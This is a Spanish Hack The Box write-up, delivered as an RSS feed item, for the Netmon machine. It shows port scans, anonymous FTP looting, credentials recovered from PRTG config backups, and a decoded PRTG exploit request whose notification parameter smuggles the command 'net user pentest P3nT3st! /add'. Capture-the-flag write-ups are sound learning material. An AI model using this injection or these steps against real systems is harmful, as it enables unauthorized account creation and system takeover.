<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Firtsmiracle blog de Ciberseguridad</title>
    <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 14 Jun 2023 18:36:00 +0000</pubDate>
    <lastBuildDate>Wed, 14 Jun 2023 18:36:00 +0000</lastBuildDate>
    <generator>Jekyll v3.9.0</generator>
    
      <item>
        <title>Maquina Netmon - htb writeup</title>
        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Netmon&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt; dificultad facil, la cual explotaremos a partir de una enumeración por &lt;code&gt;ftp&lt;/code&gt; donde obtendremos archivos de configuración con credenciales que nos permitiran conectarnos al servicio web y despues nos aprovecharemos de una vulnerabilidad de &lt;code&gt;PRTG&lt;/code&gt; que nos permitira realizar la creación de un usuario a nivel de sistema y le añadiremos permisis de administrador, para finalmente conectarnos al sistema como el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Netmon
❯ ls
 Netmon
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.152
PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
64 bytes from 10.10.10.152: icmp_seq=1 ttl=127 time=200 ms

--- 10.10.10.152 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 199.775/199.775/199.775/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt;correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 04:18 GMT
Initiating SYN Stealth Scan at 04:18
Scanning 10.10.10.152 [65535 ports]
Discovered open port 80/tcp on 10.10.10.152
Discovered open port 21/tcp on 10.10.10.152
Discovered open port 135/tcp on 10.10.10.152
Discovered open port 139/tcp on 10.10.10.152
Discovered open port 445/tcp on 10.10.10.152
Discovered open port 49667/tcp on 10.10.10.152
Discovered open port 49664/tcp on 10.10.10.152
Discovered open port 49668/tcp on 10.10.10.152
Discovered open port 47001/tcp on 10.10.10.152
Discovered open port 49666/tcp on 10.10.10.152
Discovered open port 49669/tcp on 10.10.10.152
Discovered open port 5985/tcp on 10.10.10.152
Discovered open port 49665/tcp on 10.10.10.152
Completed SYN Stealth Scan at 04:18, 23.62s elapsed (65535 total ports)
Nmap scan report for 10.10.10.152
Host is up, received user-set (0.14s latency).
Scanned at 2023-06-14 04:18:22 GMT for 24s
Not shown: 63185 closed tcp ports (reset), 2337 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.76 seconds
           Raw packets sent: 116389 (5.121MB) | Rcvd: 77893 (3.116MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 04:19 GMT
Nmap scan report for 10.10.10.152
Host is up (0.40s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       &amp;lt;DIR&amp;gt;          inetpub
| 07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
| 02-25-19  10:56PM       &amp;lt;DIR&amp;gt;          Program Files
| 02-03-19  12:28AM       &amp;lt;DIR&amp;gt;          Program Files (x86)
| 02-03-19  08:08AM       &amp;lt;DIR&amp;gt;          Users
|_02-25-19  11:49PM       &amp;lt;DIR&amp;gt;          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-06-14T04:20:28
|_  start_date: 2023-06-14T04:14:56

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.25 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;FTP&lt;/td&gt;
      &lt;td&gt;Microsoft ftpd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Indy httpd 18.1.37.13946&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;RPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Server 2008 R2 - 2012 microsoft-ds&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5985&lt;/td&gt;
      &lt;td&gt;WINRM&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;47001&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;49664-49669&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos enumerando el servicio &lt;code&gt;ftp&lt;/code&gt; haciendo uno del usuario &lt;code&gt;anonymous&lt;/code&gt;, sin proporcionar contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:fmiracle): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&amp;gt; dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       &amp;lt;DIR&amp;gt;          inetpub
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
02-25-19  10:56PM       &amp;lt;DIR&amp;gt;          Program Files
02-03-19  12:28AM       &amp;lt;DIR&amp;gt;          Program Files (x86)
02-03-19  08:08AM       &amp;lt;DIR&amp;gt;          Users
02-25-19  11:49PM       &amp;lt;DIR&amp;gt;          Windows
226 Transfer complete.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si nos dirigimos al directorio &lt;code&gt;Users&lt;/code&gt;, vemos que podemos obtener la primera flag &lt;code&gt;user.txt&lt;/code&gt;, pero aun no tenemos acceso al sistema.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; cd Users
250 CWD command successful.
ftp&amp;gt; dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       &amp;lt;DIR&amp;gt;          Administrator
02-03-19  12:35AM       &amp;lt;DIR&amp;gt;          Public
226 Transfer complete.
ftp&amp;gt; cd Public
250 CWD command successful.
ftp&amp;gt; dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Documents
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Downloads
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Music
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Pictures
06-14-23  12:15AM                   34 user.txt
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Videos
226 Transfer complete.
ftp&amp;gt; get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
34 bytes received in 0.20 secs (0.1620 kB/s)
ftp&amp;gt; exit
221 Goodbye.
❯ cat user.txt
❯ c07be14afc2253b24510769dcb7db65
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para poder enumear de una manera mas comoda los archivos mediante &lt;code&gt;ftp&lt;/code&gt;, vamos a crearnos una montura con la herramienta &lt;code&gt;curlftpfs&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curlftpfs
❯ mkdir /mnt/monturaftp
❯ curlftpfs ftp://10.10.10.152 /mnt/monturaftp
❯ ls -l /mnt/monturaftp
d--------- root root   0 B  Sun Nov 20 22:46:00 2016  $RECYCLE.BIN
d--------- root root   0 B  Sun Feb  3 08:05:00 2019  Documents and Settings
d--------- root root   0 B  Mon Feb 25 22:15:00 2019  inetpub
d--------- root root   0 B  Sat Jul 16 09:18:00 2016  PerfLogs
d--------- root root   0 B  Mon Feb 25 22:56:00 2019  Program Files
d--------- root root   0 B  Sun Feb  3 00:28:00 2019  Program Files (x86)
d--------- root root   0 B  Wed Dec 15 10:40:00 2021  ProgramData
d--------- root root   0 B  Sun Feb  3 08:05:00 2019  Recovery
d--------- root root   0 B  Sun Feb  3 08:04:00 2019  System Volume Information
d--------- root root   0 B  Sun Feb  3 08:08:00 2019  Users
d--------- root root   0 B  Mon Feb 25 23:49:00 2019  Windows
.--------- root root 380 KB Sun Nov 20 21:59:00 2016  bootmgr
.--------- root root   1 B  Sat Jul 16 09:10:00 2016  BOOTNXT
.--------- root root 704 MB Wed Jun 14 00:14:00 2023  pagefile.sys
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Antes de segui enumerando vamos a ver el servicio web, que esta expuesto en el puerto 80.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que el servicio corresponde a &lt;code&gt;PRTG Network Monitor&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;PRTG Network Monitor: PRTG (Paessler Router Traffic Grapher hasta la versión 7) es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el  tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Buscamos si hay &lt;code&gt;exploits&lt;/code&gt; asociados a este servicio y entre ellos una de ejecución remota de comandos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit PRTG
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                 | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                                                                | windows/webapps/49156.txt
PRTG Network Monitor &amp;lt; 18.1.39.1648 - Stack Overflow (Denial of Service)                                                                             | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                                              | java/webapps/34108.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El exploit nos pide estar autenticados, asi que vamos a examinar la montura que previamente creamos y trataremos de buscar archivos de configuración, ya que estos suelen almacenar credenciales.&lt;/p&gt;

&lt;p&gt;Encontramos archivos de configuración, y usaremos &lt;code&gt;diff&lt;/code&gt; para encontrar diferncias entre el archivo &lt;code&gt;.dat&lt;/code&gt; y el archivo &lt;code&gt;old.bak&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;diff &quot;PRTG Configuration.dat&quot; &quot;PRTG Configuration.old.bak&quot; | less
&amp;lt;               &amp;lt;flags&amp;gt;
&amp;lt;                 &amp;lt;encrypted/&amp;gt;
&amp;lt;               &amp;lt;/flags&amp;gt;
---
&amp;gt;             &amp;lt;!-- User: prtgadmin --&amp;gt;
&amp;gt;             PrTg@dmin2018
317c313
&amp;lt;                 77RULO2GA4Q3RVEUZ77IMPLVKABRRS2UNR3Q====
---
&amp;gt;                 6SLJOGVBYWJF5ZMURQWHEPJ3C3WT2NQDJOZA====
325c321
&amp;lt;                 IVK3MVDI6HCMYIRYQN264YLIRXNJWMB6NT3Q====
---
&amp;gt;                 ILD5YN3TROUJXG6ECLVDRKIPKTBKE274FTNQ====
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos las credenciales &lt;code&gt;prtgadmin:PrTg@dmin2018&lt;/code&gt; con las cuales podamos logearnos en el servicio &lt;code&gt;PRTG&lt;/code&gt;, pero al intentar logearnos nos dicen que las credenciales son invalidas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos tratar de hacer guesing y debido a que la contraseña termina en 2018, podemos modificarla por 2019.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Logramos conectarnos al panel como el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si revisamos el exploit que tenemos, vemos que este realiza una petición a la ruta &lt;code&gt;myaccount.htm?tabid=2&lt;/code&gt; y envia una data que se encuentra &lt;code&gt;urlencodeada&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Usaremos una sesión interactiva de &lt;code&gt;php&lt;/code&gt; para urldecodear la data y ver mejor que es lo que envia.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;❯ php --interactive
Interactive mode enabled
php &amp;gt; echo urldecode(&quot;name_=create_user&amp;amp;tags_=&amp;amp;active_=1&amp;amp;schedule_=-1%7CNone%7C&amp;amp;postpone_=1&amp;amp;comments=&amp;amp;summode_=2&amp;amp;summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&amp;amp;summinutes_=1&amp;amp;accessrights_=1&amp;amp;accessrights_=1&amp;amp;accessrights_201=0&amp;amp;active_1=0&amp;amp;addressuserid_1=-1&amp;amp;addressgroupid_1=-1&amp;amp;address_1=&amp;amp;subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;contenttype_1=text%2Fhtml&amp;amp;customtext_1=&amp;amp;priority_1=0&amp;amp;active_17=0&amp;amp;addressuserid_17=-1&amp;amp;addressgroupid_17=-1&amp;amp;message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_8=0&amp;amp;addressuserid_8=-1&amp;amp;addressgroupid_8=-1&amp;amp;address_8=&amp;amp;message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_2=0&amp;amp;eventlogfile_2=application&amp;amp;sender_2=PRTG+Network+Monitor&amp;amp;eventtype_2=error&amp;amp;message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_13=0&amp;amp;sysloghost_13=&amp;amp;syslogport_13=514&amp;amp;syslogfacility_13=1&amp;amp;syslogencoding_13=1&amp;amp;message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_14=0&amp;amp;snmphost_14=&amp;amp;snmpport_14=162&amp;amp;snmpcommunity_14=&amp;amp;snmptrapspec_14=0&amp;amp;messageid_14=0&amp;amp;message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;senderip_14=&amp;amp;active_9=0&amp;amp;url_9=&amp;amp;urlsniselect_9=0&amp;amp;urlsniname_9=&amp;amp;postdata_9=&amp;amp;active_10=0&amp;amp;active_10=10&amp;amp;address_10=Demo+EXE+Notification+-+OutFile.ps1&amp;amp;message_10=%22C%3A%5CUsers%5CPublic%5Ctester.txt%3Bnet+user+pentest+P3nT3st!+%2Fadd%22&amp;amp;windowslogindomain_10=&amp;amp;windowsloginusername_10=&amp;amp;windowsloginpassword_10=&amp;amp;timeout_10=60&amp;amp;active_15=0&amp;amp;accesskeyid_15=&amp;amp;secretaccesskeyid_15=&amp;amp;arn_15=&amp;amp;subject_15=&amp;amp;message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_16=0&amp;amp;isusergroup_16=1&amp;amp;addressgroupid_16=200%7CPRTG+Administrators&amp;amp;ticketuserid_16=100%7CPRTG+System+Administrator&amp;amp;subject_16=%25device+%25name+%25status+%25down+(%25message)&amp;amp;message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&amp;amp;autoclose_16=1&amp;amp;objecttype=notification&amp;amp;id=new&amp;amp;targeturl=%2Fmyaccount.htm%3Ftabid%3D2&quot;);

name_=create_user&amp;amp;tags_=&amp;amp;active_=1&amp;amp;schedule_=-1|None|&amp;amp;postpone_=1&amp;amp;comments=&amp;amp;summode_=2&amp;amp;summarysubject_=[%sitename] %summarycount Summarized Notifications&amp;amp;summinutes_=1&amp;amp;accessrights_=1&amp;amp;accessrights_=1&amp;amp;accessrights_201=0&amp;amp;active_1=0&amp;amp;addressuserid_1=-1&amp;amp;addressgroupid_1=-1&amp;amp;address_1=&amp;amp;subject_1=[%sitename] %device %name %status %down (%message)&amp;amp;contenttype_1=text/html&amp;amp;customtext_1=&amp;amp;priority_1=0&amp;amp;active_17=0&amp;amp;addressuserid_17=-1&amp;amp;addressgroupid_17=-1&amp;amp;message_17=[%sitename] %device %name %status %down (%message)&amp;amp;active_8=0&amp;amp;addressuserid_8=-1&amp;amp;addressgroupid_8=-1&amp;amp;address_8=&amp;amp;message_8=[%sitename] %device %name %status %down (%message)&amp;amp;active_2=0&amp;amp;eventlogfile_2=application&amp;amp;sender_2=PRTG Network Monitor&amp;amp;eventtype_2=error&amp;amp;message_2=[%sitename] %device %name %status %down (%message)&amp;amp;active_13=0&amp;amp;sysloghost_13=&amp;amp;syslogport_13=514&amp;amp;syslogfacility_13=1&amp;amp;syslogencoding_13=1&amp;amp;message_13=[%sitename] %device %name %status %down (%message)&amp;amp;active_14=0&amp;amp;snmphost_14=&amp;amp;snmpport_14=162&amp;amp;snmpcommunity_14=&amp;amp;snmptrapspec_14=0&amp;amp;messageid_14=0&amp;amp;message_14=[%sitename] %device %name %status %down (%message)&amp;amp;senderip_14=&amp;amp;active_9=0&amp;amp;url_9=&amp;amp;urlsniselect_9=0&amp;amp;urlsniname_9=&amp;amp;postdata_9=&amp;amp;active_10=0&amp;amp;active_10=10&amp;amp;address_10=Demo EXE Notification - OutFile.ps1&amp;amp;message_10=&quot;C:\Users\Public\tester.txt;net user pentest P3nT3st! /add&quot;&amp;amp;windowslogindomain_10=&amp;amp;windowsloginusername_10=&amp;amp;windowsloginpassword_10=&amp;amp;timeout_10=60&amp;amp;active_15=0&amp;amp;accesskeyid_15=&amp;amp;secretaccesskeyid_15=&amp;amp;arn_15=&amp;amp;subject_15=&amp;amp;message_15=[%sitename] %device %name %status %down (%message)&amp;amp;active_16=0&amp;amp;isusergroup_16=1&amp;amp;addressgroupid_16=200|PRTG Administrators&amp;amp;ticketuserid_16=100|PRTG System Administrator&amp;amp;subject_16=%device %name %status %down (%message)&amp;amp;message_16=Sensor: %name
Status: %status %down

&amp;amp;autoclose_16=1&amp;amp;objecttype=notification&amp;amp;id=new&amp;amp;targeturl=/myaccount.htm?tabid=2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que la data se enviar a un parametro &lt;code&gt;message_10&lt;/code&gt;, en donde crea un usuario de nombre &lt;code&gt;pentest&lt;/code&gt; a nivel de sistema &lt;code&gt;net user pentest P3nT3st! /add&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Podemos aprovecharnos de este y ejecutar una instrucción similar a la del exploit, donde crearemos un usuario al cual pondre de nombre &lt;code&gt;pentest&lt;/code&gt; y ademas lo añadire al grupo de Administradores.&lt;/p&gt;

&lt;p&gt;Nos dirigimos a la ruta a donde manda la petición, damos en &lt;code&gt;Add new Notification&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Creamos un nombre de Notificación, en este caso &lt;code&gt;Nuevo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y ahora activamos la función &lt;code&gt;Execute Program&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;podemos ver varios inputs y si los inspeccionamos encontramos el de &lt;code&gt;message_10&lt;/code&gt; que corresponde a &lt;code&gt;Parameter&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos en el campo la instrucción, donde crearemos nuestro usuario y lo añadiremos al grupo administrador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Guardamos y ahora en la notificación creada le damos en el simbolo de la campana &lt;code&gt;Send&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

